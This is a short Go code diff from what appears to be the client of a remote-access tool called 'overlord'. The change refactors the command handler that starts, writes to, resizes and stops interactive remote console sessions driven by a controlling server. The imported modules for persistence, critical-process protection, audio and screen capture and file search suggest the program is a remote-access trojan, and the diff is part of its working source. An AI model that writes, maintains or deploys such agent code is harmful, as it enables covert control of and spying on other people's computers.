@@ -16,7 +16,6 @@ import (
 
 	"overlord-client/cmd/agent/audio"
 	"overlord-client/cmd/agent/capture"
-	"overlord-client/cmd/agent/console"
 	"overlord-client/cmd/agent/criticalproc"
 	"overlord-client/cmd/agent/filesearch"
 	"overlord-client/cmd/agent/persistence"
@@ -1856,7 +1855,7 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		if sessionID == "" {
 			return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: "missing session id"})
 		}
-		if err := console.Start(ctx, env, sessionID, cols, rows); err != nil {
+		if err := env.Console.Start(ctx, runtime.ConsoleStartRequest{SessionID: sessionID, Cols: cols, Rows: rows}); err != nil {
 			_ = wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: false, Message: err.Error()})
 			return nil
 		}
@@ -1865,21 +1864,21 @@ func HandleCommand(ctx context.Context, env *runtime.Env, envelope map[string]in
 		sessionID, _ := envelopePayloadString(envelope, "sessionId")
 		data, _ := envelopePayloadString(envelope, "data")
 		if sessionID != "" && data != "" {
-			_ = console.Input(sessionID, data)
+			_ = env.Console.Write(ctx, sessionID, data)
 		}
 		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
 	case "console_stop":
 		sessionID, _ := envelopePayloadString(envelope, "sessionId")
 		if sessionID != "" {
-			console.Stop(sessionID)
+			env.Console.Stop(sessionID)
 		}
 		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
 	case "console_resize":
-
 		sessionID, _ := envelopePayloadString(envelope, "sessionId")
 		cols, rows := envelopePayloadInts(envelope)
-		_ = sessionID
-		console.Resize(sessionID, cols, rows)
+		if sessionID != "" {
+			_ = env.Console.Resize(sessionID, cols, rows)
+		}
 		return wire.WriteMsg(ctx, env.Conn, wire.CommandResult{Type: "command_result", CommandID: cmdID, OK: true})
 	case "voice_session_start":
 		sessionID, _ := envelopePayloadString(envelope, "sessionId")
